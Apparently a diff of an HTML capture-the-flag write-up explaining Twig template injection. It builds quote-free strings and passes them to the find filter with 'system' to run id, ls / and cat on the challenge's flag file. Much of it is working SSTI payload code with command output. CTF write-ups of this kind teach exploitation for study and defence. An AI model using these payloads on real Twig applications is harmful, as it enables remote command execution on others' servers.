+</span></span></code></pre></div><p>We can see this code is allowing us to include an arrow function. Easy now let&rsquo;s see how we can use find to get RCE</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span>{{ [<span style="color:#f1fa8c">&#39;id&#39;</span>]<span style="color:#ff79c6">|</span>find(<span style="color:#f1fa8c">&#39;system&#39;</span>) }} <span style="color:#6272a4">// uid=0(root) gid=0(root) groups=0(root)
+</span></span></span></code></pre></div><p>Nice! okey now for the real issues..</p>
 <h2 id="payload">Payload</h2>
 <p>In this challenge, one of the obstacles to generating a payload is finding ways to build strings without quotes or double quotes and also find ways around the array restriction &ldquo;[]&rdquo;</p>
 <p>After digging around in twig docs, we can see that we can define arrays like this without using quotes</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js">{<span style="color:#ff79c6">%</span> set foo <span style="color:#ff79c6">=</span> {foo<span style="color:#ff79c6">:</span> bar} <span style="color:#ff79c6">%</span>}
-</code></pre></div><p>but how would this help? Luckily for us, the filter <code>keys</code> can retrieve array keys and return them.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js">{<span style="color:#ff79c6">%</span> set foobar <span style="color:#ff79c6">=</span> {foo<span style="color:#ff79c6">:</span> <span style="color:#bd93f9">1</span>,bar<span style="color:#ff79c6">:</span> <span style="color:#bd93f9">2</span>}<span style="color:#ff79c6">|</span>keys <span style="color:#ff79c6">%</span>}{{dump(foobar)<span style="color:#ff79c6">|</span>raw}} <span style="color:#6272a4">// array(2) { [0]=&gt; string(3) &#34;foo&#34; [1]=&gt; string(3) &#34;bar&#34; }
-</span></code></pre></div><p>But the output is still an array? Easy we can use join() to join them into a string. And we get this.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js">{<span style="color:#ff79c6">%</span> set foobar <span style="color:#ff79c6">=</span> {foo<span style="color:#ff79c6">:</span> <span style="color:#bd93f9">1</span>,bar<span style="color:#ff79c6">:</span> <span style="color:#bd93f9">2</span>}<span style="color:#ff79c6">|</span>keys<span style="color:#ff79c6">|</span>join <span style="color:#ff79c6">%</span>}{{dump(foobar)<span style="color:#ff79c6">|</span>raw}} <span style="color:#6272a4">// string(6) &#34;foobar&#34;
-</span></code></pre></div><p>Now we can prepare our payload slowly, let&rsquo;s start with the strings</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js">
-{<span style="color:#ff79c6">%</span> set syste<span style="color:#ff79c6">=</span>{syste<span style="color:#ff79c6">:</span><span style="color:#bd93f9">1</span>}<span style="color:#ff79c6">|</span>keys<span style="color:#ff79c6">|</span>join() <span style="color:#ff79c6">%</span>}
-{<span style="color:#ff79c6">%</span> set m<span style="color:#ff79c6">=</span>{m<span style="color:#ff79c6">:</span><span style="color:#bd93f9">1</span>}<span style="color:#ff79c6">|</span>keys<span style="color:#ff79c6">|</span>join() <span style="color:#ff79c6">%</span>}
-{<span style="color:#ff79c6">%</span> set i<span style="color:#ff79c6">=</span>{i<span style="color:#ff79c6">:</span><span style="color:#bd93f9">1</span>}<span style="color:#ff79c6">|</span>keys<span style="color:#ff79c6">|</span>join() <span style="color:#ff79c6">%</span>}
-{<span style="color:#ff79c6">%</span> set d<span style="color:#ff79c6">=</span>{d<span style="color:#ff79c6">:</span><span style="color:#bd93f9">1</span>}<span style="color:#ff79c6">|</span>keys<span style="color:#ff79c6">|</span>join() <span style="color:#ff79c6">%</span>}
-{<span style="color:#ff79c6">%</span> set rce<span style="color:#ff79c6">=</span>i<span style="color:#ff79c6">~</span>d <span style="color:#ff79c6">%</span>}
-{{ {rce}<span style="color:#ff79c6">|</span>find(syste<span style="color:#ff79c6">~</span>m) }}
-
-<span style="color:#6272a4">// uid=1000 gid=1000 groups=1000 id
-</span></code></pre></div><p>okey now this is easy right?</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span>{<span style="color:#ff79c6">%</span> set foo <span style="color:#ff79c6">=</span> {foo<span style="color:#ff79c6">:</span> bar} <span style="color:#ff79c6">%</span>}
+</span></span></code></pre></div><p>but how would this help? Luckily for us, the filter <code>keys</code> can retrieve array keys and return them.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span>{<span style="color:#ff79c6">%</span> set foobar <span style="color:#ff79c6">=</span> {foo<span style="color:#ff79c6">:</span> <span style="color:#bd93f9">1</span>,bar<span style="color:#ff79c6">:</span> <span style="color:#bd93f9">2</span>}<span style="color:#ff79c6">|</span>keys <span style="color:#ff79c6">%</span>}{{dump(foobar)<span style="color:#ff79c6">|</span>raw}} <span style="color:#6272a4">// array(2) { [0]=&gt; string(3) &#34;foo&#34; [1]=&gt; string(3) &#34;bar&#34; }
+</span></span></span></code></pre></div><p>But the output is still an array? Easy we can use join() to join them into a string. And we get this.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span>{<span style="color:#ff79c6">%</span> set foobar <span style="color:#ff79c6">=</span> {foo<span style="color:#ff79c6">:</span> <span style="color:#bd93f9">1</span>,bar<span style="color:#ff79c6">:</span> <span style="color:#bd93f9">2</span>}<span style="color:#ff79c6">|</span>keys<span style="color:#ff79c6">|</span>join <span style="color:#ff79c6">%</span>}{{dump(foobar)<span style="color:#ff79c6">|</span>raw}} <span style="color:#6272a4">// string(6) &#34;foobar&#34;
+</span></span></span></code></pre></div><p>Now we can prepare our payload slowly, let&rsquo;s start with the strings</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>{<span style="color:#ff79c6">%</span> set syste<span style="color:#ff79c6">=</span>{syste<span style="color:#ff79c6">:</span><span style="color:#bd93f9">1</span>}<span style="color:#ff79c6">|</span>keys<span style="color:#ff79c6">|</span>join() <span style="color:#ff79c6">%</span>}
+</span></span><span style="display:flex;"><span>{<span style="color:#ff79c6">%</span> set m<span style="color:#ff79c6">=</span>{m<span style="color:#ff79c6">:</span><span style="color:#bd93f9">1</span>}<span style="color:#ff79c6">|</span>keys<span style="color:#ff79c6">|</span>join() <span style="color:#ff79c6">%</span>}
+</span></span><span style="display:flex;"><span>{<span style="color:#ff79c6">%</span> set i<span style="color:#ff79c6">=</span>{i<span style="color:#ff79c6">:</span><span style="color:#bd93f9">1</span>}<span style="color:#ff79c6">|</span>keys<span style="color:#ff79c6">|</span>join() <span style="color:#ff79c6">%</span>}
+</span></span><span style="display:flex;"><span>{<span style="color:#ff79c6">%</span> set d<span style="color:#ff79c6">=</span>{d<span style="color:#ff79c6">:</span><span style="color:#bd93f9">1</span>}<span style="color:#ff79c6">|</span>keys<span style="color:#ff79c6">|</span>join() <span style="color:#ff79c6">%</span>}
+</span></span><span style="display:flex;"><span>{<span style="color:#ff79c6">%</span> set rce<span style="color:#ff79c6">=</span>i<span style="color:#ff79c6">~</span>d <span style="color:#ff79c6">%</span>}
+</span></span><span style="display:flex;"><span>{{ {rce}<span style="color:#ff79c6">|</span>find(syste<span style="color:#ff79c6">~</span>m) }}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#6272a4">// uid=1000 gid=1000 groups=1000 id
+</span></span></span></code></pre></div><p>okey now this is easy right?</p>
 <p>Well there are just few complications, the flag is located at <code>/</code> so how can we get the slash?</p>
 <p>Simply find any output from a function or filter that is not blocked that outputs a slash and you can simply slice it and use it.</p>
 <p>For my case, this is what i used</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js">{<span style="color:#ff79c6">%</span> set slash<span style="color:#ff79c6">=</span>(dump()<span style="color:#ff79c6">|</span>nl2br()<span style="color:#ff79c6">|</span>slice(<span style="color:#bd93f9">14</span>,<span style="color:#bd93f9">1</span>))<span style="color:#ff79c6">|</span>join() <span style="color:#ff79c6">%</span>}
-</code></pre></div><p>ok now the space? Easy, same method for the slash.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js">{<span style="color:#ff79c6">%</span> set space<span style="color:#ff79c6">=</span>(dump()<span style="color:#ff79c6">|</span>nl2br()<span style="color:#ff79c6">|</span>slice(<span style="color:#bd93f9">13</span>,<span style="color:#bd93f9">1</span>))<span style="color:#ff79c6">|</span>join() <span style="color:#ff79c6">%</span>}
-</code></pre></div><h2 id="almost-there">Almost there</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span>{<span style="color:#ff79c6">%</span> set slash<span style="color:#ff79c6">=</span>(dump()<span style="color:#ff79c6">|</span>nl2br()<span style="color:#ff79c6">|</span>slice(<span style="color:#bd93f9">14</span>,<span style="color:#bd93f9">1</span>))<span style="color:#ff79c6">|</span>join() <span style="color:#ff79c6">%</span>}
+</span></span></code></pre></div><p>ok now the space? Easy, same method for the slash.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span>{<span style="color:#ff79c6">%</span> set space<span style="color:#ff79c6">=</span>(dump()<span style="color:#ff79c6">|</span>nl2br()<span style="color:#ff79c6">|</span>slice(<span style="color:#bd93f9">13</span>,<span style="color:#bd93f9">1</span>))<span style="color:#ff79c6">|</span>join() <span style="color:#ff79c6">%</span>}
+</span></span></code></pre></div><h2 id="almost-there">Almost there</h2>
 <p>So great now we can do <code>ls /</code> like this</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js">{<span style="color:#ff79c6">%</span> set slash<span style="color:#ff79c6">=</span>(dump()<span style="color:#ff79c6">|</span>nl2br()<span style="color:#ff79c6">|</span>slice(<span style="color:#bd93f9">14</span>,<span style="color:#bd93f9">1</span>))<span style="color:#ff79c6">|</span>join() <span style="color:#ff79c6">%</span>}
-{<span style="color:#ff79c6">%</span> set space<span style="color:#ff79c6">=</span>(dump()<span style="color:#ff79c6">|</span>nl2br()<span style="color:#ff79c6">|</span>slice(<span style="color:#bd93f9">13</span>,<span style="color:#bd93f9">1</span>))<span style="color:#ff79c6">|</span>join() <span style="color:#ff79c6">%</span>}
-{<span style="color:#ff79c6">%</span> set syste<span style="color:#ff79c6">=</span>{syste<span style="color:#ff79c6">:</span><span style="color:#bd93f9">1</span>}<span style="color:#ff79c6">|</span>keys<span style="color:#ff79c6">|</span>join() <span style="color:#ff79c6">%</span>}
-{<span style="color:#ff79c6">%</span> set m<span style="color:#ff79c6">=</span>{m<span style="color:#ff79c6">:</span><span style="color:#bd93f9">1</span>}<span style="color:#ff79c6">|</span>keys<span style="color:#ff79c6">|</span>join() <span style="color:#ff79c6">%</span>}
-{<span style="color:#ff79c6">%</span> set ls<span style="color:#ff79c6">=</span>{ls<span style="color:#ff79c6">:</span><span style="color:#bd93f9">1</span>}<span style="color:#ff79c6">|</span>keys<span style="color:#ff79c6">|</span>join() <span style="color:#ff79c6">%</span>}
-{<span style="color:#ff79c6">%</span> set rce<span style="color:#ff79c6">=</span>ls<span style="color:#ff79c6">~</span>space<span style="color:#ff79c6">~</span>slash <span style="color:#ff79c6">%</span>}
-{{ {rce}<span style="color:#ff79c6">|</span>find(syste<span style="color:#ff79c6">~</span>m) }} 
-
-<span style="color:#6272a4">// bin dev etc flag-edbfcbcaef home lib media mnt opt proc root run sbin srv sys tmp usr var ls /
-</span></code></pre></div><p>But as you see the flag has a <code>-</code> in it, so either we find a way to get a dash <code>-</code> or an asterix <code>*</code> where we can do <code>cat /flag*</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span>{<span style="color:#ff79c6">%</span> set slash<span style="color:#ff79c6">=</span>(dump()<span style="color:#ff79c6">|</span>nl2br()<span style="color:#ff79c6">|</span>slice(<span style="color:#bd93f9">14</span>,<span style="color:#bd93f9">1</span>))<span style="color:#ff79c6">|</span>join() <span style="color:#ff79c6">%</span>}
+</span></span><span style="display:flex;"><span>{<span style="color:#ff79c6">%</span> set space<span style="color:#ff79c6">=</span>(dump()<span style="color:#ff79c6">|</span>nl2br()<span style="color:#ff79c6">|</span>slice(<span style="color:#bd93f9">13</span>,<span style="color:#bd93f9">1</span>))<span style="color:#ff79c6">|</span>join() <span style="color:#ff79c6">%</span>}
+</span></span><span style="display:flex;"><span>{<span style="color:#ff79c6">%</span> set syste<span style="color:#ff79c6">=</span>{syste<span style="color:#ff79c6">:</span><span style="color:#bd93f9">1</span>}<span style="color:#ff79c6">|</span>keys<span style="color:#ff79c6">|</span>join() <span style="color:#ff79c6">%</span>}
+</span></span><span style="display:flex;"><span>{<span style="color:#ff79c6">%</span> set m<span style="color:#ff79c6">=</span>{m<span style="color:#ff79c6">:</span><span style="color:#bd93f9">1</span>}<span style="color:#ff79c6">|</span>keys<span style="color:#ff79c6">|</span>join() <span style="color:#ff79c6">%</span>}
+</span></span><span style="display:flex;"><span>{<span style="color:#ff79c6">%</span> set ls<span style="color:#ff79c6">=</span>{ls<span style="color:#ff79c6">:</span><span style="color:#bd93f9">1</span>}<span style="color:#ff79c6">|</span>keys<span style="color:#ff79c6">|</span>join() <span style="color:#ff79c6">%</span>}
+</span></span><span style="display:flex;"><span>{<span style="color:#ff79c6">%</span> set rce<span style="color:#ff79c6">=</span>ls<span style="color:#ff79c6">~</span>space<span style="color:#ff79c6">~</span>slash <span style="color:#ff79c6">%</span>}
+</span></span><span style="display:flex;"><span>{{ {rce}<span style="color:#ff79c6">|</span>find(syste<span style="color:#ff79c6">~</span>m) }} 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#6272a4">// bin dev etc flag-edbfcbcaef home lib media mnt opt proc root run sbin srv sys tmp usr var ls /
+</span></span></span></code></pre></div><p>But as you see the flag has a <code>-</code> in it, so either we find a way to get a dash <code>-</code> or an asterix <code>*</code> where we can do <code>cat /flag*</code></p>
 <p>However we can easily get the dash from this</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js">{<span style="color:#ff79c6">%</span> set dash<span style="color:#ff79c6">=</span>_charset<span style="color:#ff79c6">|</span>slice(<span style="color:#bd93f9">3</span>,<span style="color:#bd93f9">1</span>)<span style="color:#ff79c6">|</span>join() <span style="color:#ff79c6">%</span>}
-{{dash}} <span style="color:#6272a4">// -
-</span></code></pre></div><h2 id="finally">Finally</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span>{<span style="color:#ff79c6">%</span> set dash<span style="color:#ff79c6">=</span>_charset<span style="color:#ff79c6">|</span>slice(<span style="color:#bd93f9">3</span>,<span style="color:#bd93f9">1</span>)<span style="color:#ff79c6">|</span>join() <span style="color:#ff79c6">%</span>}
+</span></span><span style="display:flex;"><span>{{dash}} <span style="color:#6272a4">// -
+</span></span></span></code></pre></div><h2 id="finally">Finally</h2>
 <p>After finding all the pieces we can simply add them up together</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js">{<span style="color:#ff79c6">%</span> set slash<span style="color:#ff79c6">=</span>(dump()<span style="color:#ff79c6">|</span>nl2br()<span style="color:#ff79c6">|</span>slice(<span style="color:#bd93f9">14</span>,<span style="color:#bd93f9">1</span>))<span style="color:#ff79c6">|</span>join() <span style="color:#ff79c6">%</span>}
-{<span style="color:#ff79c6">%</span> set space<span style="color:#ff79c6">=</span>(dump()<span style="color:#ff79c6">|</span>nl2br()<span style="color:#ff79c6">|</span>slice(<span style="color:#bd93f9">13</span>,<span style="color:#bd93f9">1</span>))<span style="color:#ff79c6">|</span>join() <span style="color:#ff79c6">%</span>}
-{<span style="color:#ff79c6">%</span> set syste<span style="color:#ff79c6">=</span>{syste<span style="color:#ff79c6">:</span><span style="color:#bd93f9">1</span>}<span style="color:#ff79c6">|</span>keys<span style="color:#ff79c6">|</span>join() <span style="color:#ff79c6">%</span>}
-{<span style="color:#ff79c6">%</span> set m<span style="color:#ff79c6">=</span>{m<span style="color:#ff79c6">:</span><span style="color:#bd93f9">1</span>}<span style="color:#ff79c6">|</span>keys<span style="color:#ff79c6">|</span>join() <span style="color:#ff79c6">%</span>}
-{<span style="color:#ff79c6">%</span> set cat<span style="color:#ff79c6">=</span>{cat<span style="color:#ff79c6">:</span><span style="color:#bd93f9">1</span>}<span style="color:#ff79c6">|</span>keys<span style="color:#ff79c6">|</span>join() <span style="color:#ff79c6">%</span>}
-{<span style="color:#ff79c6">%</span> set flag1<span style="color:#ff79c6">=</span>{flag<span style="color:#ff79c6">:</span><span style="color:#bd93f9">1</span>}<span style="color:#ff79c6">|</span>keys<span style="color:#ff79c6">|</span>join() <span style="color:#ff79c6">%</span>}
-{<span style="color:#ff79c6">%</span> set dash<span style="color:#ff79c6">=</span>_charset<span style="color:#ff79c6">|</span>slice(<span style="color:#bd93f9">3</span>,<span style="color:#bd93f9">1</span>)<span style="color:#ff79c6">|</span>join() <span style="color:#ff79c6">%</span>}
-{<span style="color:#ff79c6">%</span> set flag2<span style="color:#ff79c6">=</span>{edbfcbcaef<span style="color:#ff79c6">:</span><span style="color:#bd93f9">1</span>}<span style="color:#ff79c6">|</span>keys<span style="color:#ff79c6">|</span>join() <span style="color:#ff79c6">%</span>}
-{<span style="color:#ff79c6">%</span> set rce<span style="color:#ff79c6">=</span>cat<span style="color:#ff79c6">~</span>space<span style="color:#ff79c6">~</span>slash<span style="color:#ff79c6">~</span>flag1<span style="color:#ff79c6">~</span>dash<span style="color:#ff79c6">~</span>flag2 <span style="color:#ff79c6">%</span>}
-{{ {rce}<span style="color:#ff79c6">|</span>find(syste<span style="color:#ff79c6">~</span>m) }} <span style="color:#6272a4">// CSCTF{Tw1g_tw1g_ssT1_n0_h4cKtr1ck5_th1S_t1M3}
-</span></code></pre></div><p>flag: <code>CSCTF{Tw1g_tw1g_ssT1_n0_h4cKtr1ck5_th1S_t1M3}</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span>{<span style="color:#ff79c6">%</span> set slash<span style="color:#ff79c6">=</span>(dump()<span style="color:#ff79c6">|</span>nl2br()<span style="color:#ff79c6">|</span>slice(<span style="color:#bd93f9">14</span>,<span style="color:#bd93f9">1</span>))<span style="color:#ff79c6">|</span>join() <span style="color:#ff79c6">%</span>}
+</span></span><span style="display:flex;"><span>{<span style="color:#ff79c6">%</span> set space<span style="color:#ff79c6">=</span>(dump()<span style="color:#ff79c6">|</span>nl2br()<span style="color:#ff79c6">|</span>slice(<span style="color:#bd93f9">13</span>,<span style="color:#bd93f9">1</span>))<span style="color:#ff79c6">|</span>join() <span style="color:#ff79c6">%</span>}
+</span></span><span style="display:flex;"><span>{<span style="color:#ff79c6">%</span> set syste<span style="color:#ff79c6">=</span>{syste<span style="color:#ff79c6">:</span><span style="color:#bd93f9">1</span>}<span style="color:#ff79c6">|</span>keys<span style="color:#ff79c6">|</span>join() <span style="color:#ff79c6">%</span>}
+</span></span><span style="display:flex;"><span>{<span style="color:#ff79c6">%</span> set m<span style="color:#ff79c6">=</span>{m<span style="color:#ff79c6">:</span><span style="color:#bd93f9">1</span>}<span style="color:#ff79c6">|</span>keys<span style="color:#ff79c6">|</span>join() <span style="color:#ff79c6">%</span>}
+</span></span><span style="display:flex;"><span>{<span style="color:#ff79c6">%</span> set cat<span style="color:#ff79c6">=</span>{cat<span style="color:#ff79c6">:</span><span style="color:#bd93f9">1</span>}<span style="color:#ff79c6">|</span>keys<span style="color:#ff79c6">|</span>join() <span style="color:#ff79c6">%</span>}
+</span></span><span style="display:flex;"><span>{<span style="color:#ff79c6">%</span> set flag1<span style="color:#ff79c6">=</span>{flag<span style="color:#ff79c6">:</span><span style="color:#bd93f9">1</span>}<span style="color:#ff79c6">|</span>keys<span style="color:#ff79c6">|</span>join() <span style="color:#ff79c6">%</span>}
+</span></span><span style="display:flex;"><span>{<span style="color:#ff79c6">%</span> set dash<span style="color:#ff79c6">=</span>_charset<span style="color:#ff79c6">|</span>slice(<span style="color:#bd93f9">3</span>,<span style="color:#bd93f9">1</span>)<span style="color:#ff79c6">|</span>join() <span style="color:#ff79c6">%</span>}
+</span></span><span style="display:flex;"><span>{<span style="color:#ff79c6">%</span> set flag2<span style="color:#ff79c6">=</span>{edbfcbcaef<span style="color:#ff79c6">:</span><span style="color:#bd93f9">1</span>}<span style="color:#ff79c6">|</span>keys<span style="color:#ff79c6">|</span>join() <span style="color:#ff79c6">%</span>}
+</span></span><span style="display:flex;"><span>{<span style="color:#ff79c6">%</span> set rce<span style="color:#ff79c6">=</span>cat<span style="color:#ff79c6">~</span>space<span style="color:#ff79c6">~</span>slash<span style="color:#ff79c6">~</span>flag1<span style="color:#ff79c6">~</span>dash<span style="color:#ff79c6">~</span>flag2 <span style="color:#ff79c6">%</span>}
+</span></span><span style="display:flex;"><span>{{ {rce}<span style="color:#ff79c6">|</span>find(syste<span style="color:#ff79c6">~</span>m) }} <span style="color:#6272a4">// CSCTF{Tw1g_tw1g_ssT1_n0_h4cKtr1ck5_th1S_t1M3}
+</span></span></span></code></pre></div><p>flag: <code>CSCTF{Tw1g_tw1g_ssT1_n0_h4cKtr1ck5_th1S_t1M3}</code></p>
 <h2 id="notes">Notes</h2>
 <p>The main part of this challenge is finding the <code>find</code> filter. However, there are many other ways other than filters as long as they have some method of using a callback/arrow function like this <code>$arrow($v,$k)</code></p>
 <p>Some examples are the <code>has some</code> and <code>has every</code> which are operators in Twig.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js">
-    <span style="color:#ff79c6">public</span> <span style="color:#ff79c6">static</span> <span style="color:#8be9fd;font-style:italic">function</span> arrayEvery(Environment $env, $array, $arrow)
-    {
-        self<span style="color:#ff79c6">::</span>checkArrowInSandbox($env, $arrow, <span style="color:#f1fa8c">&#39;has every&#39;</span>, <span style="color:#f1fa8c">&#39;operator&#39;</span>);
-
-        foreach ($array as $k =&gt; $v) {
-            <span style="color:#ff79c6">if</span> (<span style="color:#ff79c6">!</span>$arrow($v, $k)) {
-                <span style="color:#ff79c6">return</span> <span style="color:#ff79c6">false</span>;
-            }
-        }
-
-        <span style="color:#ff79c6">return</span> <span style="color:#ff79c6">true</span>;
-    }
-</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js">    <span style="color:#ff79c6">public</span> <span style="color:#ff79c6">static</span> <span style="color:#8be9fd;font-style:italic">function</span> arraySome(Environment $env, $array, $arrow)
-    {
-        self<span style="color:#ff79c6">::</span>checkArrowInSandbox($env, $arrow, <span style="color:#f1fa8c">&#39;has some&#39;</span>, <span style="color:#f1fa8c">&#39;operator&#39;</span>);
-
-        foreach ($array as $k =&gt; $v) {
-            <span style="color:#ff79c6">if</span> ($arrow($v, $k)) {
-                <span style="color:#ff79c6">return</span> <span style="color:#ff79c6">true</span>;
-            }
-        }
-
-        <span style="color:#ff79c6">return</span> <span style="color:#ff79c6">false</span>;
-    }
-</code></pre></div>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">public</span> <span style="color:#ff79c6">static</span> <span style="color:#8be9fd;font-style:italic">function</span> arrayEvery(Environment $env, $array, $arrow)
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>        self<span style="color:#ff79c6">::</span>checkArrowInSandbox($env, $arrow, <span style="color:#f1fa8c">&#39;has every&#39;</span>, <span style="color:#f1fa8c">&#39;operator&#39;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        foreach ($array as $k =&gt; $v) {
+</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">if</span> (<span style="color:#ff79c6">!</span>$arrow($v, $k)) {
+</span></span><span style="display:flex;"><span>                <span style="color:#ff79c6">return</span> <span style="color:#ff79c6">false</span>;
+</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">return</span> <span style="color:#ff79c6">true</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span>    <span style="color:#ff79c6">public</span> <span style="color:#ff79c6">static</span> <span style="color:#8be9fd;font-style:italic">function</span> arraySome(Environment $env, $array, $arrow)
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>        self<span style="color:#ff79c6">::</span>checkArrowInSandbox($env, $arrow, <span style="color:#f1fa8c">&#39;has some&#39;</span>, <span style="color:#f1fa8c">&#39;operator&#39;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        foreach ($array as $k =&gt; $v) {
+</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">if</span> ($arrow($v, $k)) {
+</span></span><span style="display:flex;"><span>                <span style="color:#ff79c6">return</span> <span style="color:#ff79c6">true</span>;
+</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">return</span> <span style="color:#ff79c6">false</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span></code></pre></div>
     <a href="/"> >> Home</a>
   </main>
 </div>
